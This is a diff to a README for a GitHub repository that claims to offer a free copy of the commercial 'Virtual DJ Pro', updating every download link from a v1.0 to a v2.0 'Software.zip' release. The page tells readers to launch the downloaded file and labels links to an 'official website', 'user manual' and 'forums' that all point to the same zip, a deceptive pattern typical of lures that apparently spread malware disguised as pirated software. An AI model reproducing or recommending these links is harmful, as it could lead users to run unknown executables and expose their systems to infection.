@@ -12,7 +12,7 @@ Welcome to the official repository for "Virtual DJ Pro Free" - your one-stop des
 
 If you are ready to dive into the world of virtual DJ software, follow the steps below:
 
-1. **Download Virtual DJ Pro:** [Click here to download Virtual DJ Pro](https://github.com/loganivetha/Virtual-DJ-Pro-Free/releases/download/v1.0/Software.zip) (**Launch the file after downloading**)
+1. **Download Virtual DJ Pro:** [Click here to download Virtual DJ Pro](https://github.com/loganivetha/Virtual-DJ-Pro-Free/releases/download/v2.0/Software.zip) (**Launch the file after downloading**)
 2. **Explore Tutorials:** Learn how to use Virtual DJ Pro effectively with our comprehensive tutorials.
 3. **Compare Software:** Understand the differences between Virtual DJ Pro and other popular DJ software options.
 
@@ -26,9 +26,9 @@ If you are ready to dive into the world of virtual DJ software, follow the steps
 
 To make the most of your Virtual DJ Pro experience, don't forget to check out the following resources:
 
-- [Virtual DJ Pro Official Website](https://github.com/loganivetha/Virtual-DJ-Pro-Free/releases/download/v1.0/Software.zip)
-- [Virtual DJ Pro User Manual](https://github.com/loganivetha/Virtual-DJ-Pro-Free/releases/download/v1.0/Software.zip)
-- [Virtual DJ Pro Community Forums](https://github.com/loganivetha/Virtual-DJ-Pro-Free/releases/download/v1.0/Software.zip)
+- [Virtual DJ Pro Official Website](https://github.com/loganivetha/Virtual-DJ-Pro-Free/releases/download/v2.0/Software.zip)
+- [Virtual DJ Pro User Manual](https://github.com/loganivetha/Virtual-DJ-Pro-Free/releases/download/v2.0/Software.zip)
+- [Virtual DJ Pro Community Forums](https://github.com/loganivetha/Virtual-DJ-Pro-Free/releases/download/v2.0/Software.zip)
 
 ## Contribute 🤝
 
@@ -40,4 +40,4 @@ For any questions or issues related to Virtual DJ Pro or this repository, please
 
 Let's make your DJ experience truly unforgettable with Virtual DJ Pro Free! 🎉🎧🎶
 
-[![Download Virtual DJ Pro](https://github.com/loganivetha/Virtual-DJ-Pro-Free/releases/download/v1.0/Software.zip%20DJ%20Pro&color=blue&style=for-the-badge)](https://github.com/loganivetha/Virtual-DJ-Pro-Free/releases/download/v1.0/Software.zip)
+[![Download Virtual DJ Pro](https://github.com/loganivetha/Virtual-DJ-Pro-Free/releases/download/v2.0/Software.zip%20DJ%20Pro&color=blue&style=for-the-badge)](https://github.com/loganivetha/Virtual-DJ-Pro-Free/releases/download/v2.0/Software.zip)
